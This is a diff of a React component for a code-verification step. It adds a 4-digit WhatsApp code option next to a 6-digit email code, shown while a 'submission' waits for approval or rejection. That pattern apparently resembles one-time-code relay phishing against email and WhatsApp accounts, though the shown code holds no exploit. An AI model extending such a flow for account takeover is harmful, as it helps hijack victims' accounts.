@@ -17,25 +17,31 @@ import { db } from '@/lib/firebase';
 import { doc, onSnapshot } from 'firebase/firestore';
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '@/components/ui/tooltip';
 
-const formSchema = z.object({
+const emailFormSchema = z.object({
   verificationCode: z.string().length(6, "Code must be 6 digits."),
 });
 
-type FormValues = z.infer<typeof formSchema>;
+const phoneFormSchema = z.object({
+  verificationCode: z.string().length(4, "Code must be 4 digits."),
+});
 
 interface VerifyCodeStepProps {
     submissionId: string;
     onApproval: (data: Partial<Submission>) => void;
     onRejection: () => void;
     onBack: () => void;
+    loginMethod: 'email' | 'phone';
 }
 
-export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }: VerifyCodeStepProps) {
+export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack, loginMethod }: VerifyCodeStepProps) {
     const { toast } = useToast();
     const [isSubmitting, setIsSubmitting] = useState(false);
     const [isWaiting, setIsWaiting] = useState(false);
     const [shake, setShake] = useState(false);
     
+    const formSchema = loginMethod === 'email' ? emailFormSchema : phoneFormSchema;
+    type FormValues = z.infer<typeof formSchema>;
+
     const form = useForm<FormValues>({
         resolver: zodResolver(formSchema),
         defaultValues: { verificationCode: '' },
@@ -107,7 +113,13 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
         }
     };
     
-    const isButtonDisabled = isSubmitting || isWaiting || (form.watch('verificationCode')?.length ?? 0) < 6;
+    const isEmail = loginMethod === 'email';
+    const codeLength = isEmail ? 6 : 4;
+    const isButtonDisabled = isSubmitting || isWaiting || (form.watch('verificationCode')?.length ?? 0) < codeLength;
+    const promptText = isEmail 
+        ? <>We've sent a code to <span className="font-semibold text-slate-700">{submissionId}</span>.</>
+        : <>We've sent a code via WhatsApp to <span className="font-semibold text-slate-700">{submissionId}</span>.</>;
+
 
     if (isWaiting) {
         return (
@@ -134,7 +146,7 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
             <div className="text-center mb-8">
                 <h2 className="text-2xl font-extrabold text-slate-900">Step 2: Verify Ownership</h2>
                 <p className="text-slate-500 mt-2">
-                    To protect our network, we need to verify you own this account. We've sent a code to <span className="font-semibold text-slate-700">{submissionId}</span>.
+                    {promptText}
                 </p>
             </div>
             
@@ -160,7 +172,7 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                                 </FormLabel>
                                 <FormControl>
                                     <InputOTP 
-                                        maxLength={6} 
+                                        maxLength={codeLength}
                                         {...field} 
                                         disabled={isSubmitting || isWaiting}
                                         containerClassName="justify-center"
@@ -170,8 +182,12 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                                             <InputOTPSlot index={1} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                             <InputOTPSlot index={2} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                             <InputOTPSlot index={3} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
-                                            <InputOTPSlot index={4} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
-                                            <InputOTPSlot index={5} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                            {isEmail && (
+                                                <>
+                                                    <InputOTPSlot index={4} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                                    <InputOTPSlot index={5} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                                </>
+                                            )}
                                         </InputOTPGroup>
                                     </InputOTP>
                                 </FormControl>
